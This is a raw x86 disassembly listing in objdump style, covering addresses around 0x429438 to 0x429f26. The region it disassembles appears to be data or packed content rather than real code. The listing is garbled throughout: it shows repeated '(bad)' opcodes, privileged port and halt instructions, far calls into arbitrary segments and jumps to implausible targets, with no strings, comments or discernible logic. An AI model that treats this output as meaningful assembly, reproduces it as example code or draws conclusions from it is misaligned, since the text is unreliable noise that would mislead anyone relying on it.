  429438:	fmul   DWORD PTR [ecx]
  42943a:	cwde   
  42943b:	mov    WORD PTR [ebx],cs
  42943d:	jmp    0x4e4b7241
  429442:	ja     0x4294a9
  429444:	cmp    eax,0x6e921790
  429449:	xchg   ebp,eax
  42944a:	cs aas 
  42944c:	fbld   TBYTE PTR [esi]
  42944e:	pop    ecx
  42944f:	lods   eax,DWORD PTR ds:[esi]
  429450:	cmp    eax,0x407e02fc
  429455:	dec    eax
  429456:	jbe    0x429442
  429458:	or     ch,ah
  42945a:	sbb    eax,0xff035c86
  42945f:	push   cs
  429460:	idiv   bl
  429462:	mov    WORD PTR [ebx+0x63],?
  429465:	sub    BYTE PTR [edx+0x5437011],al
  42946b:	and    eax,DWORD PTR [eax+0x12]
  42946e:	dec    eax
  42946f:	xor    esp,DWORD PTR [edi]
  429471:	push   0x36
  429473:	mov    ebx,0x605f5cb
  429478:	jmp    0x429461
  42947a:	sti    
  42947b:	jecxz  0x42942f
  42947d:	jb     0x4294f7
  42947f:	pop    ebx
  429480:	mov    ch,0x94
  429482:	pop    ecx
  429483:	mov    WORD PTR [edi+0x5c],?
  429486:	pop    esi
  429487:	cmc    
  429488:	push   esi
  429489:	dec    esi
  42948a:	sub    BYTE PTR [ebx+0x16],0x7d
  42948e:	hlt    
  42948f:	call   0x360d:0x26aa9add
  429496:	shl    BYTE PTR [ebx-0x43],cl
  429499:	int3   
  42949a:	sbb    cl,BYTE PTR [eax]
  42949c:	pop    edi
  42949d:	jecxz  0x4294ba
  42949f:	sub    ch,BYTE PTR [edx]
  4294a1:	sahf   
  4294a2:	retf   0xfeb3
  4294a5:	div    DWORD PTR [edi]
  4294a7:	xor    eax,0x567246c3
  4294ac:	out    dx,al
  4294ad:	sbb    bl,BYTE PTR [ebp-0x7e66a18]
  4294b3:	pop    ebp
  4294b4:	pop    edi
  4294b6:	mov    DWORD PTR [esi-0x612fa521],ebp
  4294bc:	xchg   DWORD PTR [edi+0xb1ae5c],ebp
	...
  429532:	add    BYTE PTR [eax],al
  429534:	push   ecx
  429535:	div    BYTE PTR ds:0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0x34a4c4f3
  429542:	(bad)  
  429543:	shr    DWORD PTR [esi],cl
  429545:	mov    dh,0x1
  429547:	add    ch,dh
  429549:	add    BYTE PTR [eax],al
  42954b:	add    BYTE PTR [edx+0x26],bl
  42954e:	mov    al,0xa9
  429550:	dec    ebx
  429551:	and    dh,ch
  429553:	jno    0x42956a
  429555:	jp     0x42957e
  429557:	sub    ebp,ecx
  429559:	and    al,0xed
  42955b:	inc    ebx
  42955c:	cmp    esp,ebx
  42955e:	add    bh,al
  429560:	retf   0xfcd9
  429563:	ja     0x429573
  429565:	(bad)  
  429567:	(bad)  
  429568:	xchg   edx,eax
  429569:	ja     0x4295df
  42956b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42956c:	mov    cl,0xbb
  42956e:	mov    bl,0x66
  429570:	add    edx,ebx
  429572:	(bad)  
  429573:	lahf   
  429574:	push   ebx
  429575:	or     BYTE PTR [edx-0x6af24c0c],bh
  42957b:	cld    
  42957c:	repnz mov edi,0x61097ea4
  429582:	sbb    eax,0x6211012b
  429587:	pop    eax
  429588:	in     eax,dx
  429589:	ret    0x6b5c
  42958c:	dec    eax
  42958d:	and    eax,0x5f9e5571
  429592:	jns    0x42953a
  429594:	leave  
  429595:	int3   
  429596:	jge    0x42959f
  429598:	mov    esp,DWORD PTR [ebp+ebx*1+0x40]
  42959c:	mov    BYTE PTR [edi+edx*2+0x1fd1896b],cl
  4295a3:	pop    ds
  4295a4:	cmp    BYTE PTR [ebx],ah
  4295a6:	and    esi,esp
  4295a8:	xchg   esi,eax
  4295a9:	js     0x429568
  4295ab:	cmp    eax,0x460b1b0d
  4295b0:	bound  ecx,QWORD PTR [edx-0x57]
  4295b3:	cdq    
  4295b4:	retf   
  4295b5:	js     0x429538
  4295b7:	add    ah,BYTE PTR [edi]
  4295b9:	sbb    eax,0x148b48bb
  4295be:	jno    0x429598
  4295c0:	mov    ah,0x5
  4295c2:	imul   esi,DWORD PTR [ebp-0x327f439e],0xe1b7ee32
  4295cc:	and    DWORD PTR [ebx+0x78],ecx
  4295cf:	ja     0x4295ff
  4295d1:	pop    edx
  4295d2:	jecxz  0x429566
  4295d4:	cmp    eax,0x8e128aaa
  4295d9:	(bad)  
  4295db:	inc    eax
  4295dc:	sub    al,0xaa
  4295de:	add    eax,0xb6755f2f
  4295e3:	hlt    
  4295e4:	push   edx
  4295e5:	mov    bh,0x74
  4295e7:	jns    0x42960a
  4295e9:	retf   0x9462
  4295ec:	pop    edi
  4295ed:	addr16 aam 0xe0
  4295f0:	sbb    edi,DWORD PTR [esi-0x7e]
  4295f3:	xchg   esi,ebp
  4295f5:	push   esi
  4295f6:	mov    ah,0xd2
  4295f8:	jge    0x429625
  4295fa:	bound  edx,QWORD PTR [eax-0x54]
  4295fd:	js     0x42961b
  4295ff:	inc    ecx
  429600:	add    edx,DWORD PTR [ebx-0x1016431d]
  429606:	pop    ebp
  429607:	cmp    DWORD PTR [esi],esp
  429609:	pop    ebp
  42960a:	rol    BYTE PTR [ebx+eax*1-0x9851c80],0x84
  429612:	int    0xb7
  429614:	adc    BYTE PTR [eax],dh
  429616:	jmp    0x3a34ebfa
  42961b:	adc    BYTE PTR [edi],bl
  42961d:	outs   dx,BYTE PTR ds:[esi]
  42961e:	ds add dl,bh
  429621:	add    al,cl
  429623:	jg     0x4295c7
  429625:	inc    edi
  429626:	retf   0xa0ac
  429629:	aad    0x3f
  42962b:	mov    fs,ebp
  42962d:	fisubr WORD PTR [esi]
  42962f:	loop   0x42966d
  429631:	adc    BYTE PTR [edi+edx*4-0x53],0xaf
  429636:	mov    DWORD PTR [ebx],edi
  429638:	cld    
  429639:	mov    bh,0xac
  42963b:	dec    edx
  42963c:	dec    esp
  42963d:	pop    ebp
  42963e:	jle    0x4295cd
  429640:	xchg   esi,eax
	...
  4296b1:	add    BYTE PTR [eax],al
  4296b3:	add    BYTE PTR [esi+0x5b],dl
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	pop    es
  4296c1:	fadd   DWORD PTR [edi+0x1b72371]
  4296c7:	add    ch,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [esi+0x68],bl
  4296ce:	pop    eax
  4296cf:	dec    eax
  4296d0:	icebp  
  4296d1:	inc    edx
  4296d2:	pop    esi
  4296d3:	jge    0x429660
  4296d5:	das    
  4296d6:	retf   
  4296d7:	daa    
  4296d8:	sti    
  4296d9:	or     DWORD PTR [ebp-0x53],ecx
  4296dc:	cmp    edx,ebp
  4296de:	dec    esi
  4296df:	stc    
  4296e0:	je     0x4296f0
  4296e2:	cli    
  4296e3:	pop    ecx
  4296e4:	mov    ch,0x5
  4296e6:	arpl   WORD PTR [edx+0x2985dfa],dx
  4296ec:	inc    ebx
  4296ed:	push   edx
  4296ee:	push   edx
  4296ef:	pusha  
  4296f0:	outs   dx,DWORD PTR ds:[esi]
  4296f1:	mov    esp,0xde58ff21
  4296f6:	inc    ebx
  4296f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296f8:	cmp    BYTE PTR [eax],ch
  4296fa:	xor    BYTE PTR [edi+ebp*8],dl
  4296fd:	mov    ah,0xfd
  4296ff:	adc    edi,DWORD PTR [eax+0x4a]
  429702:	gs pop ss
  429704:	jge    0x4296b0
  429706:	in     al,0x7a
  429708:	cmc    
  429709:	pop    ecx
  42970a:	jno    0x4296a1
  42970c:	sub    ecx,DWORD PTR [eax]
  42970e:	outs   dx,BYTE PTR ds:[esi]
  42970f:	dec    ebx
  429710:	mov    eax,?
  429712:	clc    
  429713:	add    BYTE PTR [edi],0xa2
  429716:	mov    dh,0xee
  429718:	jecxz  0x4296c7
  42971a:	xor    BYTE PTR [ebx+ecx*4],dl
  42971d:	sahf   
  42971e:	jae    0x42979d
  429720:	fdiv   st,st(0)
  429722:	sub    esi,esi
  429724:	out    dx,al
  429725:	in     al,0xf6
  429727:	scas   al,BYTE PTR es:[edi]
  429728:	aaa    
  429729:	mov    esi,0x940b6644
  42972e:	test   BYTE PTR [ebp+0x19a5a5af],0x3a
  429735:	scas   eax,DWORD PTR es:[edi]
  429736:	inc    esi
  429737:	and    al,0x91
  429739:	lea    eax,[ecx+eiz*4+0x28b4dfdc]
  429740:	clc    
  429741:	dec    edx
  429742:	loopne 0x4297a8
  429744:	les    ebx,FWORD PTR [edi-0x1a0194e7]
  42974a:	mov    bl,0x87
  42974c:	out    0x9b,al
  42974e:	xchg   ebx,eax
  42974f:	or     eax,0x924634e6
  429754:	or     bl,ah
  429756:	or     BYTE PTR [edi+0x1],cl
  429759:	out    dx,eax
  42975a:	sub    eax,0x1bd5185f
  42975f:	stos   BYTE PTR es:[edi],al
  429760:	sbb    BYTE PTR [eax-0x705ed2ec],0x5a
  429767:	or     eax,DWORD PTR ds:0xed526cea
  42976d:	sbb    esp,DWORD PTR [eax+0x75]
  429770:	mov    bl,0x78
  429772:	push   ebx
  429773:	adc    eax,0x4b650a97
  429778:	jle    0x429710
  42977a:	mov    WORD PTR [ecx+0x95067bf],?
  429780:	or     al,0x75
  429782:	fs sub al,0x64
  429785:	int3   
  429786:	pop    ebp
  429787:	sub    BYTE PTR [eax],ch
  429789:	cwde   
  42978a:	fbstp  TBYTE PTR es:[eax]
  42978d:	ins    DWORD PTR es:[edi],dx
  42978e:	mov    ecx,0xb1371d46
  429793:	test   eax,0xa47b3c2f
  429798:	gs and edx,edx
  42979b:	mov    bl,0xb8
  42979d:	xchg   BYTE PTR [ebx+0x6b],ah
  4297a0:	mov    ebp,0x67e6266d
  4297a5:	icebp  
  4297a6:	adc    al,0x2c
  4297a8:	in     eax,dx
  4297a9:	out    0xd5,al
  4297ab:	push   DWORD PTR [ebx-0x28]
  4297ae:	jp     0x4297a9
  4297b0:	int    0xc5
  4297b2:	and    eax,0x7869fafb
  4297b7:	jae    0x4297e2
  4297b9:	call   0xf943cf98
  4297be:	mov    ebx,0xf86
	...
  429833:	add    BYTE PTR [esi],ah
  429835:	jp     0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    ecx,edx
  429841:	fst    QWORD PTR [ecx]
  429843:	das    
  429844:	sbb    BYTE PTR [eax+0xf50001],bh
  42984a:	add    BYTE PTR [eax],al
  42984c:	in     al,0xd2
  42984e:	fadd   QWORD PTR [ebp+0x60]
  429851:	dec    edi
  429852:	clc    
  429853:	add    DWORD PTR ds:0x2b9d462,ebx
  429859:	push   esi
  42985a:	nop
  42985b:	adc    esi,eax
  42985d:	(bad)
  429861:	xor    al,0x1e
  429863:	xchg   BYTE PTR [ecx-0x64],dh
  429866:	test   al,dh
  429868:	cmp    dh,BYTE PTR [ebx]
  42986a:	mov    eax,ds:0xa3ec3966
  42986f:	xor    eax,DWORD PTR [edi+0x2da7cf4c]
  429875:	(bad)  
  429876:	fcom   DWORD PTR [eax-0x38bfeb0f]
  42987c:	sbb    BYTE PTR [ecx+0x74],0x4a
  429880:	out    0xb1,al
  429882:	ins    BYTE PTR es:[edi],dx
  429883:	mov    esi,0x3ae44864
  429888:	fidivr DWORD PTR [ecx-0x4eb878d]
  42988e:	or     bh,ch
  429890:	sub    DWORD PTR [ebx+0x6b],eax
  429893:	inc    esi
  429894:	lods   eax,DWORD PTR ds:[esi]
  429895:	mov    ebx,0x415d120a
  42989a:	push   ds
  42989b:	ret    0x904c
  42989e:	sbb    al,0x10
  4298a0:	sub    bh,ch
  4298a2:	pop    edi
  4298a3:	push   edx
  4298a4:	inc    edi
  4298a5:	dec    ecx
  4298a6:	loopne 0x429869
  4298a8:	xchg   ebp,eax
  4298a9:	mov    fs,edx
  4298ab:	pop    ecx
  4298ac:	pop    ebp
  4298ad:	mov    dl,0xa2
  4298af:	ret    0x8317
  4298b2:	addr16 xchg edx,eax
  4298b4:	es in  eax,dx
  4298b6:	or     DWORD PTR gs:[edi-0x1e],edx
  4298ba:	div    BYTE PTR [ecx+0x5e]
  4298bd:	push   cs
  4298be:	cli    
  4298bf:	loop   0x42993d
  4298c1:	mov    esi,0x77eb9f35
  4298c6:	sbb    esp,DWORD PTR [ebp-0x22d3eda1]
  4298cc:	push   edi
  4298cd:	aad    0x5
  4298cf:	mov    ebx,fs
  4298d1:	dec    esi
  4298d2:	mov    dh,0xef
  4298d4:	and    eax,0x881e9d56
  4298d9:	sbb    eax,DWORD PTR [ecx-0x3bb5214]
  4298df:	aam    0x4d
  4298e1:	imul   esp,ebp,0x32
  4298e4:	or     eax,0x609c35db
  4298e9:	repnz sbb DWORD PTR [esi+edi*4],edx
  4298ed:	pop    edi
  4298ee:	xor    cl,BYTE PTR [ebp-0x23]
  4298f1:	test   bh,0x32
  4298f4:	sub    cl,al
  4298f6:	mov    al,0x1f
  4298f8:	push   0xe798fac5
  4298fd:	stos   DWORD PTR es:[edi],eax
  4298fe:	ds hlt 
  429900:	adc    al,0xab
  429902:	fistp  DWORD PTR [esi-0x25341f47]
  429908:	dec    edx
  429909:	sub    al,0x3e
  42990b:	test   eax,0xb53d5456
  429910:	das    
  429911:	repnz cs sub al,0x71
  429915:	cs mov cl,0x4c
  429918:	sbb    DWORD PTR [ebx+0x46],eax
  42991b:	xor    bl,0xb8
  42991e:	sbb    edi,DWORD PTR [ecx]
  429920:	push   0xb9a12bd9
  429925:	and    al,0xec
  429927:	popf   
  429928:	(bad)  
  429929:	aam    0xbe
  42992b:	xchg   ebx,eax
  42992c:	icebp  
  42992d:	popa   
  42992e:	xchg   edi,eax
  42992f:	call   0x914b5537
  429934:	lea    ebp,ds:0x54454337
  42993a:	mov    eax,ds:0x3a59e605
  42993f:	aas    
  429940:	add    BYTE PTR [eax],0x0
	...
  4299b3:	add    BYTE PTR [ebp+0xc],cl
  4299b6:	clc    
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    DWORD PTR [ebx],ebx
  4299c1:	push   edx
  4299c2:	in     eax,dx
  4299c3:	sbb    DWORD PTR ds:0xf50001b9,ecx
  4299c9:	add    BYTE PTR [eax],al
  4299cb:	add    BYTE PTR [eax+0x65007882],bh
  4299d1:	div    DWORD PTR [edx-0x458c9a14]
  4299d7:	(bad)  
  4299d8:	jnp    0x429974
  4299da:	and    BYTE PTR [edx],ah
  4299dc:	jne    0x4299cd
  4299de:	sub    dl,BYTE PTR [edx-0x611b1781]
  4299e4:	out    0x3e,al
  4299e6:	sub    BYTE PTR [esi+0x3c2f16ba],bl
  4299ec:	push   ebp
  4299ed:	mov    ch,0xf2
  4299ef:	popa   
  4299f0:	add    DWORD PTR [edx],ecx
  4299f2:	sbb    DWORD PTR [eax+0x13],esi
  4299f5:	int    0x73
  4299f7:	je     0x4299c5
  4299f9:	repnz imul ecx,DWORD PTR [ecx-0x1a5c4db7],0x94a53095
  429a04:	cmp    DWORD PTR [esi],esp
  429a06:	call   0x1f4a:0x30e68165
  429a0d:	add    BYTE PTR [edx+0x42f09c40],bh
  429a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a14:	enter  0x4e63,0xce
  429a18:	sbb    DWORD PTR [ebx+ecx*2-0x70],ecx
  429a1c:	sbb    DWORD PTR [edi-0x1c],ebx
  429a1f:	jle    0x429a29
  429a21:	adc    ch,BYTE PTR [edx+0x4]
  429a24:	dec    BYTE PTR cs:[edi]
  429a27:	xchg   edi,eax
  429a28:	or     BYTE PTR [esi-0x6a],ch
  429a2b:	pop    esp
  429a2c:	mov    al,ds:0x3293a213
  429a31:	lods   eax,DWORD PTR ds:[esi]
  429a32:	call   0xc294:0x52d5ccf8
  429a39:	xor    bl,0xdd
  429a3c:	in     eax,dx
  429a3d:	adc    al,0x42
  429a3f:	call   0x8554:0x4ae95bf3
  429a46:	cdq    
  429a47:	aaa    
  429a48:	test   al,0xad
  429a4a:	or     eax,0x94d22beb
  429a4f:	popa   
  429a50:	jnp    0x429a1a
  429a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a53:	pusha  
  429a54:	pop    ecx
  429a55:	or     dh,bl
  429a57:	or     BYTE PTR [edx-0x6d],dh
  429a5a:	sbb    dh,cl
  429a5c:	loop   0x429a35
  429a5e:	sbb    al,0xad
  429a60:	jge    0x4299f5
  429a62:	xchg   ebp,eax
  429a63:	push   ebp
  429a64:	mov    bl,0x9e
  429a66:	clc    
  429a67:	mov    eax,ds:0xbbdd43dd
  429a6c:	shr    BYTE PTR [ecx+ecx*2-0x77b14664],1
  429a73:	popa   
  429a74:	push   eax
  429a75:	popf   
  429a76:	sub    eax,0x5b5a768a
  429a7b:	fstp   DWORD PTR [ebx]
  429a7d:	sub    eax,0x45de6edb
  429a82:	stos   DWORD PTR es:[edi],eax
  429a83:	ror    BYTE PTR [ecx],1
  429a85:	jmp    0xe418:0xf61ba69f
  429a8c:	inc    ecx
  429a8d:	or     al,0xe0
  429a8f:	addr16 int 0xbe
  429a92:	cs std 
  429a94:	stos   DWORD PTR es:[edi],eax
  429a95:	outs   dx,DWORD PTR ds:[esi]
  429a96:	ds dec ecx
  429a98:	mov    eax,ds:0xcf6ac7f9
  429a9d:	sti    
  429a9e:	test   ebx,eax
  429aa0:	jne    0x429af8
  429aa2:	mov    WORD PTR [edi],ds
  429aa4:	test   ah,bl
  429aa6:	mov    dl,0x43
  429aa8:	outs   dx,DWORD PTR ds:[esi]
  429aa9:	outs   dx,DWORD PTR ds:[esi]
  429aaa:	xor    bh,ch
  429aac:	nop
  429aad:	sub    al,0xe3
  429aaf:	test   al,0x53
  429ab1:	dec    esi
  429ab2:	add    DWORD PTR [esi+0x79],esi
  429ab5:	and    eax,0x31b2934e
  429aba:	int3   
  429abb:	mov    al,ds:0x957ea999
  429ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  429b31:	add    BYTE PTR [eax],al
  429b33:	add    ch,al
  429b35:	push   ebp
  429b36:	mov    bh,dl
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0xa12f
  429b42:	rcl    BYTE PTR ds:0x1ba02,1
  429b48:	cmc    
  429b49:	add    BYTE PTR [eax],al
  429b4b:	add    BYTE PTR [ebx-0x7c],bl
  429b4e:	jns    0x429b32
  429b50:	xchg   BYTE PTR [ecx-0x7b6960c0],bl
  429b56:	push   ecx
  429b57:	sbb    bl,cl
  429b59:	gs mov edi,0xd45089df
  429b5f:	(bad)  
  429b61:	pop    ebp
  429b62:	cmp    BYTE PTR [eax+0x27771e82],cl
  429b68:	jnp    0x429b63
  429b6a:	lea    edi,ds:0x6a092405
  429b70:	sti    
  429b71:	or     al,0x94
  429b73:	lahf   
  429b74:	out    dx,al
  429b75:	mov    ds:0x5b5d904a,eax
  429b7a:	(bad)  
  429b7b:	mov    ebx,0x501bb8b6
  429b80:	bswap  esi
  429b82:	je     0x429b95
  429b84:	adc    dh,BYTE PTR [ebp-0x69bdb403]
  429b8a:	add    eax,0x29ee7c54
  429b8f:	and    bh,BYTE PTR [esi+ebx*2+0x116d374f]
  429b96:	sub    DWORD PTR [edi-0x3950448a],0x52dea1fc
  429ba0:	jb     0x429b3e
  429ba2:	mov    edx,0x102bfe64
  429ba7:	pop    ebx
  429ba8:	adc    bh,al
  429baa:	mov    bh,0xc0
  429bac:	stos   BYTE PTR es:[edi],al
  429bad:	cli    
  429bae:	and    BYTE PTR [eax+0x1],bh
  429bb1:	lock add al,0xb2
  429bb4:	fcomp  DWORD PTR [edx]
  429bb6:	int3   
  429bb7:	xchg   DWORD PTR [eax-0x2e],ecx
  429bba:	(bad)  [eax]
  429bbc:	cmc    
  429bbd:	xor    BYTE PTR [esi-0x1f],ch
  429bc0:	sbb    al,0xd3
  429bc2:	inc    esp
  429bc3:	cmp    ch,BYTE PTR [edx]
  429bc5:	bound  ebx,QWORD PTR [eax]
  429bc7:	inc    ecx
  429bc8:	test   BYTE PTR [ebp+esi*2-0x4507de76],0x61
  429bd0:	js     0x429be3
  429bd2:	xchg   ebp,eax
  429bd3:	(bad)  
  429bd4:	(bad)  
  429bd5:	cld    
  429bd6:	mov    eax,ds:0x350c58c7
  429bdb:	adc    eax,DWORD PTR [ebp+0x701c038d]
  429be1:	lahf   
  429be2:	cmc    
  429be3:	jl     0x429b91
  429be5:	jle    0x429b7d
  429be7:	cld    
  429be8:	dec    esp
  429be9:	cmp    al,0x3e
  429beb:	push   esi
  429bec:	es xchg ch,ah
  429bef:	(bad)  
  429bf2:	mov    edx,0x2e6d318d
  429bf7:	fwait
  429bf8:	ins    BYTE PTR es:[edi],dx
  429bf9:	dec    edx
  429bfa:	mov    al,0x43
  429bfc:	mov    al,0xb5
  429bfe:	inc    edx
  429bff:	cmp    dl,BYTE PTR [ebp-0x42]
  429c02:	cld    
  429c03:	lea    ebx,[esi+eax*8-0x56]
  429c07:	dec    ebp
  429c08:	imul   edx,DWORD PTR [eax-0x11],0xffffffd4
  429c0c:	mov    dl,0xf2
  429c0e:	cdq    
  429c0f:	sub    ecx,ebx
  429c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c12:	out    dx,al
  429c13:	sub    al,0x55
  429c15:	mov    DWORD PTR [eax-0x4edcd557],ecx
  429c1b:	or     al,0xc8
  429c1d:	adc    ebx,eax
  429c1f:	in     al,0x74
  429c21:	adc    esp,eax
  429c23:	push   ecx
  429c24:	mov    al,ds:0xe4b87ec1
  429c29:	push   ds
  429c2a:	and    eax,0xad29af84
  429c2f:	sar    bh,1
  429c31:	jns    0x429c58
  429c33:	bound  bx,DWORD PTR [eax+0x168817ed]
  429c3a:	fs repz sti 
  429c3d:	cmp    BYTE PTR [ebx+0x35],bh
  429c40:	sbb    BYTE PTR [eax],al
	...
  429cb2:	add    BYTE PTR [eax],al
  429cb4:	xor    DWORD PTR [ebp+0x75f531f1],0xd7dfb5c1
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	(bad)  
  429cc2:	test   eax,0x1baf7ed
  429cc7:	add    ch,dh
  429cc9:	add    BYTE PTR [eax],al
  429ccb:	add    BYTE PTR [ebx],bl
  429ccd:	ja     0x429cf1
  429ccf:	xchg   esi,eax
  429cd0:	pop    ebp
  429cd1:	test   BYTE PTR [ebx-0x2d9c876b],al
  429cd7:	mov    dh,0x8
  429cd9:	mov    edx,0xfa80681c
  429cde:	xchg   ebp,ebx
  429ce0:	loop   0x429c8c
  429ce2:	adc    esi,DWORD PTR [edx+eiz*8+0x5d0fd58e]
  429ce9:	ins    DWORD PTR es:[edi],dx
  429cea:	xor    esp,edi
  429cec:	mov    esi,es
  429cee:	jmp    DWORD PTR [edx-0x33]
  429cf1:	xchg   esp,eax
  429cf2:	out    dx,al
  429cf3:	aaa    
  429cf4:	jne    0x429ceb
  429cf6:	push   esi
  429cf7:	sbb    DWORD PTR [ebx],esp
  429cf9:	leave  
  429cfa:	bound  edi,QWORD PTR [esi-0x414c74c9]
  429d00:	push   cs
  429d01:	dec    ebp
  429d02:	sti    
  429d03:	icebp  
  429d04:	(bad)  
  429d05:	add    al,0x43
  429d07:	scas   eax,DWORD PTR es:[edi]
  429d08:	jg     0x429c94
  429d0a:	ss mov ah,0x2f
  429d0d:	add    eax,0x167a1e1c
  429d12:	pop    edi
  429d13:	pop    edi
  429d14:	sar    DWORD PTR [eax+esi*4+0x35867ba4],1
  429d1b:	popa   
  429d1c:	fsub   DWORD PTR [ebx+0x15]
  429d1f:	xchg   dl,al
  429d21:	xor    eax,0x64b75bca
  429d26:	xor    BYTE PTR [edi],al
  429d28:	xchg   ebp,eax
  429d29:	(bad)  
  429d2a:	(bad)  
  429d2b:	repz jge 0x429cf3
  429d2e:	push   cs
  429d2f:	test   eax,ecx
  429d31:	popa   
  429d32:	test   al,0x52
  429d34:	inc    esp
  429d35:	and    eax,0xbe7616df
  429d3a:	or     edx,DWORD PTR [esi+0x57bde2b0]
  429d40:	cmp    al,BYTE PTR ds:0x9aba3070
  429d46:	call   0x268866a
  429d4b:	push   0x28
  429d4d:	mov    ebx,0x8af1db53
  429d52:	mov    esi,0xd0ace267
  429d57:	clc    
  429d58:	pop    ecx
  429d59:	int    0xfd
  429d5b:	jo     0x429d7f
  429d5d:	dec    edi
  429d5e:	pop    es
  429d5f:	jmp    0xd69952ad
  429d64:	mov    al,0x3b
  429d66:	cmp    ebx,esp
  429d68:	dec    ebp
  429d69:	inc    edx
  429d6a:	mov    ch,0x97
  429d6c:	pop    es
  429d6d:	rol    BYTE PTR [eax+0x551366e0],1
  429d73:	fmul   QWORD PTR [ecx]
  429d75:	ds inc eax
  429d77:	(bad)  
  429d78:	(bad)  
  429d79:	mov    al,0x7b
  429d7b:	mov    al,0xcb
  429d7d:	xor    eax,0xe831802c
  429d82:	xor    al,0x82
  429d84:	test   DWORD PTR [ebx],ebx
  429d86:	mov    al,0x7e
  429d88:	mov    edi,0x4be9c9be
  429d8d:	and    eax,0x7b072e78
  429d92:	inc    ebp
  429d93:	jmp    esi
  429d95:	ret    0x4429
  429d98:	push   eax
  429d99:	gs aam 0xd0
  429d9c:	dec    ebp
  429d9d:	mov    WORD PTR [ecx],cs
  429d9f:	xchg   BYTE PTR [ebp+0x1da9d327],bh
  429da5:	bound  ecx,QWORD PTR [edi+0x698f23f2]
  429dab:	call   0xbff09619
  429db0:	pop    esi
  429db1:	xor    DWORD PTR [edi-0x27],ecx
  429db4:	in     eax,0x9
  429db6:	sbb    al,bl
  429db8:	push   eax
  429db9:	loop   0x429db9
  429dbb:	scas   al,BYTE PTR es:[edi]
  429dbc:	shl    DWORD PTR ds:0x26b6c9,0x0
	...
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax-0x52b1d120]
  429e41:	sub    eax,DWORD PTR [ecx+0x1bbeca2]
  429e47:	add    ch,dh
  429e49:	add    BYTE PTR [eax],al
  429e4b:	add    dh,al
  429e4d:	stc    
  429e4e:	cmp    BYTE PTR [edi],bl
  429e50:	sub    DWORD PTR gs:[ebp-0x333ff138],eax
  429e57:	jg     0x429eb5
  429e59:	add    eax,0x84f59788
  429e5e:	ss push cs
  429e60:	mov    cs:0x1b02142c,al
  429e66:	pop    esp
  429e67:	out    dx,eax
  429e68:	pop    eax
  429e69:	jl     0x429e80
  429e6b:	bound  ebx,QWORD PTR ds:0x925fd26
  429e71:	dec    ebx
  429e72:	imul   edx,DWORD PTR [esi+ebp*4-0x338e9b88],0xe76d4c78
  429e7d:	leave  
  429e7e:	stos   DWORD PTR es:[edi],eax
  429e7f:	dec    ebp
  429e80:	xchg   ebx,eax
  429e81:	mov    ch,0x2b
  429e83:	out    dx,eax
  429e84:	scas   al,BYTE PTR es:[edi]
  429e85:	pop    edx
  429e86:	pop    ss
  429e87:	mov    dh,0xfb
  429e89:	dec    ebp
  429e8a:	mov    bh,0xee
  429e8c:	or     al,0xbe
  429e8e:	pop    ebx
  429e8f:	ror    BYTE PTR [ebx+0x5f35359b],cl
  429e95:	or     al,bl
  429e97:	and    BYTE PTR [esi-0x72fa3184],ch
  429e9d:	out    0x2e,al
  429e9f:	push   esi
  429ea0:	mov    ah,0xb4
  429ea2:	push   esp
  429ea3:	ja     0x429eb3
  429ea5:	fist   DWORD PTR [eax+0x65]
  429ea8:	cdq    
  429ea9:	ret    0xcd12
  429eac:	adc    eax,0xd9b92e10
  429eb1:	mov    eax,ds:0x7b06e263
  429eb6:	add    ah,cl
  429eb8:	mov    edi,0x7ebb5049
  429ebd:	pop    esi
  429ebe:	or     bl,BYTE PTR [ebx]
  429ec0:	mov    eax,0x3fd48462
  429ec5:	xor    eax,eax
  429ec7:	jne    0x429f07
  429ec9:	imul   BYTE PTR [ebp-0x30]
  429ecc:	inc    ecx
  429ecd:	stos   DWORD PTR es:[edi],eax
  429ece:	jae    0x429e8b
  429ed0:	dec    esp
  429ed1:	adc    BYTE PTR [ecx+0x3e],dl
  429ed4:	shl    DWORD PTR [ebp+0x43fe5de5],0xeb
  429edb:	lahf   
  429edc:	push   0x53925c94
  429ee1:	js     0x429e99
  429ee3:	and    ebx,DWORD PTR [ebx+eax*4+0x40]
  429ee7:	jle    0x429eec
  429ee9:	xor    esp,esi
  429eeb:	(bad)  
  429eec:	scas   eax,DWORD PTR es:[edi]
  429eed:	or     dh,bl
  429eef:	and    BYTE PTR [edx+esi*2],0xda
  429ef3:	push   ecx
  429ef4:	dec    esi
  429ef5:	jbe    0x429f57
  429ef7:	inc    ebx
  429ef8:	das    
  429ef9:	fucomp st(1)
  429efb:	jo     0x429e87
  429efd:	cwde   
  429efe:	scas   al,BYTE PTR es:[edi]
  429eff:	add    bl,bl
  429f01:	lods   al,BYTE PTR ds:[esi]
  429f02:	hlt    
  429f03:	xor    bh,BYTE PTR [ebx+ebx*4-0xb270a4b]
  429f0a:	mov    al,0xe
  429f0c:	call   0x1d48:0xa396d0b1
  429f13:	cmp    DWORD PTR [edi+0x40f608f8],ebp
  429f19:	mov    DWORD PTR [edx],esp
  429f1b:	in     al,0xa0
  429f1d:	inc    ecx
  429f1e:	ret    
  429f1f:	adc    al,0x2
  429f21:	mov    ds:0xf174aa4f,eax
  429f26:	ss mov ecx,0xefb392bb
